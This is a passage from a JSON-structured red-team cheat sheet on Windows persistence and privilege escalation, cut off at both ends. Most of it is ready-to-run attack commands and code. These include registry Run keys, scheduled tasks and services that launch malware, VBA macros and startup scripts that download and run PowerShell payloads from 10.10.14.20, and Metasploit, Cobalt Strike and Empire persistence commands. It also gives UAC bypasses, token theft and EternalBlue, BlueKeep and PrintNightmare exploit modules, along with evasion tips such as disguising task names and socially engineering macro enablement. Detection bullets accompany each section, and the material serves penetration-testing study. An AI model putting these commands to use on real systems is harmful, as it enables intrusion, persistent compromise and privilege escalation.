              "text": "# Local Machine Run Key (requires admin)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemUpdate\" /t REG_SZ /d \"C:\\malware.exe\" /f\n\n# RunOnce Key (executes once then deletes)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"Cleanup\" /t REG_SZ /d \"C:\\malware.exe\" /f"
            },
            {
              "type": "p",
              "parts": [
                "**Advanced registry persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# UserInit MPR Logon Script (executes before explorer)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"UserInit\" /t REG_SZ /d \"C:\\malware.exe,\" /f\n\n# AppInit DLLs (DLLs loaded into every process)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"AppInit_DLLs\" /t REG_SZ /d \"C:\\malware.dll\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"LoadAppInit_DLLs\" /t REG_DWORD /d 1 /f"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell registry modification:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Create run key via PowerShell\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"UpdateService\" -Value \"C:\\malware.exe\" -PropertyType String -Force\n\n# Check existing run keys\nGet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Malware executes automatically on user login. Registry changes persist through reboots. Some locations require administrative privileges."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor registry changes in Run keys (",
                    "**Sysmon Event ID 12, 13**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "Application whitelisting (",
                    "**AppLocker**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of suspicious Run key modifications"
                  ]
                },
                {
                  "parts": [
                    "Regular auditing of autorun locations"
                  ]
                },
                {
                  "parts": [
                    "Use Microsoft's ",
                    "**Autoruns**",
                    " tool for detection"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**reg.exe**",
                ", ",
                "**PowerShell**",
                ", ",
                "**Autoruns**",
                ", ",
                "**Metasploit**",
                " persistence modules"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate-looking key names. Consider using fileless techniques with ",
                {
                  "type": "inline_code",
                  "text": "regsvr32"
                },
                ", ",
                {
                  "type": "inline_code",
                  "text": "mshta"
                },
                ", or ",
                {
                  "type": "inline_code",
                  "text": "rundll32"
                },
                ". Clean up registry entries after engagement."
              ]
            },
            {
              "type": "h3",
              "text": "3.2 Scheduled Tasks"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Windows Task Scheduler can be abused to execute malicious code at specific times, on user logon, or system startup. This is a very reliable persistence mechanism."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Command-line scheduled tasks:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Create task running as SYSTEM\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\malware.exe\" /sc onstart /ru SYSTEM /f\n\n# Create task running on user logon\nschtasks /create /tn \"UserUpdate\" /tr \"C:\\malware.exe\" /sc onlogon /ru \"%USERNAME%\" /f\n\n# Create daily task\nschtasks /create /tn \"DailyMaintenance\" /tr \"C:\\malware.exe\" /sc daily /st 09:00 /f\n\n# Run task immediately\nschtasks /run /tn \"SystemUpdate\"\n\n# Delete task (cleanup)\nschtasks /delete /tn \"SystemUpdate\" /f"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell scheduled tasks:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Create scheduled task via PowerShell\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\malware.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName \"WindowsUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest -User \"SYSTEM\"\n\n# Create task for specific user\n$Trigger = New-ScheduledTaskTrigger -AtLogOn -User \"DOMAIN\\User\"\nRegister-ScheduledTask -TaskName \"OfficeUpdate\" -Action $Action -Trigger $Trigger\n\n# List all tasks\nGet-ScheduledTask | Where-Object {$_.State -ne \"Disabled\"}"
            },
            {
              "type": "p",
              "parts": [
                "**Hidden scheduled tasks:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Create hidden task (not visible in Task Scheduler UI)\nschtasks /create /tn \"\\Microsoft\\Windows\\SystemMaintenance\" /tr \"C:\\malware.exe\" /sc daily /st 00:00 /ru SYSTEM /f"
            },
            {
              "type": "p",
              "parts": [
                "**Task with arguments:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Task with command arguments\nschtasks /create /tn \"PowerShellUpdate\" /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\malware.ps1\" /sc once /st 00:00 /f"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reliable execution at specified times or events. Tasks survive reboots. Some task creation requires administrative privileges."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor scheduled task creation (",
                    "**Sysmon Event ID 106**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "Audit scheduled tasks regularly"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of suspicious task names or actions"
                  ]
                },
                {
                  "parts": [
                    "Limit who can create scheduled tasks via GPO"
                  ]
                },
                {
                  "parts": [
                    "Use PowerShell ",
                    {
                      "type": "inline_code",
                      "text": "Get-ScheduledTask"
                    },
                    " for auditing"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**schtasks.exe**",
                ", PowerShell ",
                {
                  "type": "inline_code",
                  "text": "ScheduledTask"
                },
                " module, Task Scheduler MMC"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use task names that mimic legitimate system tasks. Place executable in common system directories. Consider using system binaries for fileless execution."
              ]
            },
            {
              "type": "h3",
              "text": "3.3 Startup Folders"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Simple persistence via files placed in startup folders that automatically execute when a user logs in. This has a low technical barrier but is easily detectable."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**User startup folder:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Current user startup (most common)\ncopy malware.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\"\n\n# Alternative user startup path\ncopy malware.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\""
            },
            {
              "type": "p",
              "parts": [
                "**System startup folder (requires admin):**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# All users startup folder\ncopy malware.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\malware.exe\"\n\n# Alternative system startup (shortcut)\ncopy malware.exe \"C:\\Users\\Public\\Desktop\\malware.lnk\""
            },
            {
              "type": "p",
              "parts": [
                "**Startup folder via PowerShell:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Copy to startup via PowerShell\nCopy-Item \"malware.exe\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\"\n\n# Create shortcut in startup\n$WshShell = New-Object -comObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk\")\n$Shortcut.TargetPath = \"C:\\malware.exe\"\n$Shortcut.Save()"
            },
            {
              "type": "p",
              "parts": [
                "**Fileless startup techniques:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Script files in startup\necho powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\" > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat\"\n\n# VBScript in startup\necho Set shell = CreateObject(\"Wscript.Shell\"): shell.Run \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, True > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs\""
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "File executes when user logs in. Very reliable but easily spotted. No special privileges required for the user startup folder."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Regular scanning of startup folders"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " monitoring of startup folder modifications"
                  ]
                },
                {
                  "parts": [
                    "Application control blocking unauthorized executables"
                  ]
                },
                {
                  "parts": [
                    "User training on suspicious files"
                  ]
                },
                {
                  "parts": [
                    "Monitor process creation from startup locations"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Windows Explorer, ",
                "**PowerShell**",
                ", Batch files"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use filenames that mimic legitimate software. Consider using scripts instead of executables. Clean up startup entries after engagement."
              ]
            },
            {
              "type": "h3",
              "text": "3.4 Services"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Creating Windows services that run automatically at system startup with ",
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                " privileges. This is a highly reliable and powerful persistence mechanism."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Create Windows service:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Create service via sc\nsc create \"WindowsUpdateService\" binPath= \"C:\\malware.exe\" start= auto\nsc start \"WindowsUpdateService\"\n\n# Create service with description\nsc create \"SystemMonitor\" binPath= \"C:\\malware.exe\" start= auto DisplayName= \"System Monitoring Service\""
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell service creation:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Create service via PowerShell\nNew-Service -Name \"UpdateService\" -BinaryPathName \"C:\\malware.exe\" -StartupType \"Automatic\" -Description \"Windows Update Service\"\n\n# Start the service\nStart-Service -Name \"UpdateService\"\n\n# Modify existing service\nsc config \"BITS\" binPath= \"C:\\malware.exe\""
            },
            {
              "type": "p",
              "parts": [
                "**Service with dependencies:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Create service that depends on critical services (starts after them)\nsc create \"CriticalUpdate\" binPath= \"C:\\malware.exe\" start= auto depend= \"LanmanServer/LanmanWorkstation\""
            },
            {
              "type": "p",
              "parts": [
                "**Service recovery options:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Configure service to restart on failure\nsc failure \"WindowsUpdateService\" reset= 60 actions= restart/5000/restart/5000/restart/5000\nsc failure \"WindowsUpdateService\" command= \"C:\\malware.exe\""
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell advanced service management:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Create service with full configuration\n$service = @{\n    Name = \"SystemMonitor\"\n    BinaryPathName = \"C:\\malware.exe\"\n    StartupType = \"Automatic\"\n    Description = \"System Monitoring and Maintenance\"\n    DisplayName = \"System Monitor\"\n}\nNew-Service @service\n\n# Check service status\nGet-Service -Name \"SystemMonitor\""
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Service runs with ",
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                " privileges on boot. Highly reliable persistence. Requires administrative privileges to create services."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor service creation (",
                    "**Sysmon Event ID 7045**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "Regular service auditing"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of suspicious service names or binary paths"
                  ]
                },
                {
                  "parts": [
                    "Service executable digital signature verification"
                  ]
                },
                {
                  "parts": [
                    "Least privilege principle for service accounts"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**sc.exe**",
                ", ",
                "**PowerShell**",
                ", Services MMC, ",
                "**MSFVenom**",
                " service persistence"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use service names that mimic legitimate Windows services. Place executable in system directories. Consider service recovery options for resilience."
              ]
            },
            {
              "type": "h3",
              "text": "3.5 Office Macros"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "VBA macros in Office documents execute payloads when documents are opened. This is a classic initial access vector that can also provide persistence if documents are regularly used."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Basic `AutoOpen` macro:**"
              ]
            },
            {
              "type": "code",
              "language": "vba",
              "text": "Sub AutoOpen()\n    Dim payload As String\n    payload = \"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\n    Shell payload, vbHide\nEnd Sub\n\n' Alternative for different Office versions\nSub Document_Open()\n    AutoOpen\nEnd Sub\n\nSub Workbook_Open()\n    AutoOpen\nEnd Sub"
            },
            {
              "type": "p",
              "parts": [
                "**Stealthier macro techniques:**"
              ]
            },
            {
              "type": "code",
              "language": "vba",
              "text": "' Using WScript.Shell for execution\nSub AutoOpen()\n    Dim ws As Object\n    Set ws = CreateObject(\"WScript.Shell\")\n    ws.Run \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, False\nEnd Sub\n\n' Using MSXML for download and execution\nSub Document_Open()\n    Dim xml As Object, stream As Object, shell As Object\n    Set xml = CreateObject(\"MSXML2.XMLHTTP\")\n    Set stream = CreateObject(\"ADODB.Stream\")\n    Set shell = CreateObject(\"WScript.Shell\")\n\n    xml.Open \"GET\", \"http://10.10.14.20/payload.exe\", False\n    xml.Send\n\n    stream.Open\n    stream.Type = 1\n    stream.Write xml.responseBody\n    stream.SaveToFile \"C:\\Users\\Public\\payload.exe\", 2\n    stream.Close\n\n    shell.Run \"C:\\Users\\Public\\payload.exe\", 0, False\nEnd Sub"
            },
            {
              "type": "p",
              "parts": [
                "**Macro with embedded payload:**"
              ]
            },
            {
              "type": "code",
              "language": "vba",
              "text": "' Base64 encoded payload in macro\nSub AutoOpen()\n    Dim base64 As String, payload As String, shell As Object\n    base64 = \"BASE64_ENCODED_PAYLOAD_HERE\"\n\n    ' Decode and execute (simplified example)\n    Set shell = CreateObject(\"WScript.Shell\")\n    shell.Run \"powershell -enc \" & base64, 0, False\nEnd Sub"
            },
            {
              "type": "p",
              "parts": [
                "**Persistence through template modification:**"
              ]
            },
            {
              "type": "code",
              "language": "vba",
              "text": "' Modify Normal.dotm template (Word) for persistence\nSub AutoExec()\n    ' Runs when Word starts\n    Shell \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", vbHide\nEnd Sub"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Macro executes when the document is opened. May trigger security warnings. User must enable content for execution."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Block macros from internet sources via GPO"
                  ]
                },
                {
                  "parts": [
                    "Monitor ",
                    {
                      "type": "inline_code",
                      "text": "winword.exe"
                    },
                    " spawning unusual child processes"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of macro behavior patterns"
                  ]
                },
                {
                  "parts": [
                    "Office security settings to disable macros"
                  ]
                },
                {
                  "parts": [
                    "**AMSI**",
                    " scanning of macro content"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Microsoft Office, ",
                "**Macro Pack**",
                ", ",
                "**Unicorn**",
                ", ",
                "**Evil Clippy**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use social engineering to encourage enabling macros. Obfuscate macro code. Consider document properties and metadata for realism."
              ]
            },
            {
              "type": "h3",
              "text": "3.6 Implant Persistence (C2 Frameworks)"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Built-in persistence mechanisms in Command and Control frameworks automatically maintain access even after reboots or connection loss."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Meterpreter persistence module\nrun persistence -U -i 60 -p 443 -r 10.10.14.20\n\n# Advanced options\nrun persistence -U -i 30 -p 443 -r 10.10.14.20 -S -A -X\n\n# Service persistence\nrun persistence -S -U -i 60 -p 443 -r 10.10.14.20\n\n# Clean up persistence\nrun multi_console_command -rc /root/.msf4/logs/persistence/clean_up.rc"
            },
            {
              "type": "p",
              "parts": [
                "**Cobalt Strike persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Elevate to SYSTEM and create service\nbeacon> getsystem\nbeacon> powerpick Get-Service\n\n# Create scheduled task for persistence\nbeacon> schtasks /create /tn \"SystemUpdate\" /tr \"C:\\beacon.exe\" /sc onstart /ru SYSTEM\n\n# Make token and run as admin for persistence\nbeacon> make_token DOMAIN\\User Password123\nbeacon> runasadmin"
            },
            {
              "type": "p",
              "parts": [
                "**Empire persistence modules:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Empire stager with persistence\nusestager windows/launcher_bat\nset Listener http\nset OutFile /tmp/stager.bat\nexecute\n\n# Persistence module\nusemodule persistence/elevated/wmi\nset Listener http\nset DailyTime 09:00\nexecute"
            },
            {
              "type": "p",
              "parts": [
                "**Custom beacon persistence scripts:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerShell persistence script for C2\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\beacon.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName \"WindowsUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest -User \"SYSTEM\""
            },
            {
              "type": "p",
              "parts": [
                "**Memory-based persistence:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Reflective DLL injection for fileless persistence\nbeacon> inject 0 listener\n\n# Process hollowing for stealth\nbeacon> shinject 1520 x64 /payloads/beacon.bin"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Automated persistence that survives reboots. Multiple fallback mechanisms. Integration with C2 framework for management."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**EDR**",
                    " detection of C2 framework signatures"
                  ]
                },
                {
                  "parts": [
                    "Monitor for unusual scheduled tasks or services"
                  ]
                },
                {
                  "parts": [
                    "Network traffic analysis for beaconing patterns"
                  ]
                },
                {
                  "parts": [
                    "Memory analysis for injected code"
                  ]
                },
                {
                  "parts": [
                    "Application control policies"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit**",
                ", ",
                "**Cobalt Strike**",
                ", ",
                "**Empire**",
                ", ",
                "**Sliver**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use custom payloads to avoid signature detection. Implement jitter and sleep times. Use domain fronting and encrypted C2 channels."
              ]
            },
            {
              "type": "h2",
              "text": "4. 🚀 Privilege Escalation"
            },
            {
              "type": "h3",
              "text": "4.1 Token Manipulation"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Abusing Windows access tokens to impersonate higher-privileged users or ",
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                ". Critical for moving from user to admin privileges."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit token commands:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# List available tokens\nmeterpreter > use incognito\nmeterpreter > list_tokens -u\n\n# Impersonate token\nmeterpreter > impersonate_token \"DOMAIN\\\\Administrator\"\n\n# Revert to original token\nmeterpreter > revert_to_self\n\n# Steal token from process\nmeterpreter > steal_token <pid>"
            },
            {
              "type": "p",
              "parts": [
                "**Rotten Potato/Juicy Potato:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Juicy Potato for SERVICE -> SYSTEM\nJuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *\n\n# Rotten Potato from meterpreter\nmeterpreter > upload /usr/share/webshells/rottenpotato.exe\nmeterpreter > execute -H -c -f rottenpotato.exe\nmeterpreter > getuid"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell token manipulation:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerShell Incognito module\nImport-Module .\\Incognito.ps1\nInvoke-TokenManipulation -ImpersonateUser -Username \"DOMAIN\\Administrator\"\n\n# Check current token privileges\nwhoami /priv\nwhoami /groups"
            },
            {
              "type": "p",
              "parts": [
                "**Manual token theft with C++:**"
              ]
            },
            {
              "type": "code",
              "language": "cpp",
              "text": "// Requires SeDebugPrivilege\nOpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);\nDuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);\nImpersonateLoggedOnUser(hDupToken);"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Ability to execute commands as different users. ",
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                " privileges from service accounts. May require specific privileges like ",
                {
                  "type": "inline_code",
                  "text": "SeImpersonate"
                },
                "."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor token manipulation (",
                    "**Windows Event 4672**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of token theft patterns"
                  ]
                },
                {
                  "parts": [
                    "Limit ",
                    {
                      "type": "inline_code",
                      "text": "SeDebugPrivilege"
                    },
                    " and ",
                    {
                      "type": "inline_code",
                      "text": "SeImpersonatePrivilege"
                    }
                  ]
                },
                {
                  "parts": [
                    "Protected Process Light (",
                    "**PPL**",
                    ") for critical services"
                  ]
                },
                {
                  "parts": [
                    "Regular privilege audits"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Incognito**",
                ", ",
                "**Juicy Potato**",
                ", ",
                "**Rotten Potato**",
                ", ",
                "**Metasploit**",
                " token modules"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use from service accounts with ",
                {
                  "type": "inline_code",
                  "text": "SeImpersonate"
                },
                ". Avoid obvious process injection. Clean up tokens after use."
              ]
            },
            {
              "type": "h3",
              "text": "4.2 UAC Bypass"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Bypassing User Account Control (UAC) prompts to execute code with elevated privileges without user interaction. Essential for ",
                {
                  "type": "inline_code",
                  "text": "admin"
                },
                " -> ",
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                " escalation."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**FodHelper UAC bypass:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Registry modification for fodhelper\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f\nfodhelper.exe\n\n# Cleanup\nreg delete \"HKCU\\Software\\Classes\\ms-settings\\\" /f"
            },
            {
              "type": "p",
              "parts": [
                "**Event Viewer UAC bypass:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using eventvwr.exe\nreg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\neventvwr.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit UAC modules:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Various UAC bypass modules\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_injection\nuse exploit/windows/local/bypassuac_eventvwr\nset SESSION 1\nexploit"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell UAC bypass:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerShell UAC bypass\nImport-Module .\\Invoke-UACBypass.ps1\nInvoke-UACBypass -Payload \"C:\\malware.exe\"\n\n# Alternative method\nStart-Process \"C:\\malware.exe\" -Verb RunAs"
            },
            {
              "type": "p",
              "parts": [
                "**SilentClean UAC bypass:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using sdclt.exe\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /d \"C:\\malware.exe\" /f\nsdclt.exe /kickoffelev"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Elevated privileges without UAC prompt. Works on default UAC settings. Requires user to be in local administrators group."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor registry modifications in ",
                    {
                      "type": "inline_code",
                      "text": "Classes"
                    },
                    " keys"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of UAC bypass patterns"
                  ]
                },
                {
                  "parts": [
                    "Set UAC to highest level"
                  ]
                },
                {
                  "parts": [
                    "**AppLocker**",
                    " restrictions"
                  ]
                },
                {
                  "parts": [
                    "Process monitoring for elevation patterns"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**UACME**",
                ", ",
                "**Metasploit**",
                " UAC modules, ",
                "**PowerShell Empire**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Test on target OS version. Use least noisy method first. Clean registry changes after execution."
              ]
            },
            {
              "type": "h3",
              "text": "4.3 Kernel Exploits"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Exploiting vulnerabilities in the Windows kernel to gain ",
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                " privileges. High-risk but highly effective for privilege escalation."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Identify potential exploits:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Windows Exploit Suggester\npython windows-exploit-suggester.py --database 2021-06-10-mssb.xls --systeminfo systeminfo.txt\n\n# Manual system info collection\nsysteminfo\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Metasploit local exploit suggester\nuse post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun"
            },
            {
              "type": "p",
              "parts": [
                "**Common kernel exploits:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# EternalBlue (MS17-010)\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.10\nexploit\n\n# BlueKeep (CVE-2019-0708)\nuse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOST 10.10.10.10\nexploit\n\n# PrintNightmare (CVE-2021-1675)\nuse exploit/windows/dcerpc/cve_2021_1675_printspooler\nset RHOST 10.10.10.10\nexploit"
            },
            {
              "type": "p",
              "parts": [
                "**Compile and run exploits:**"
              ]
            },
            {
              "type": "code",
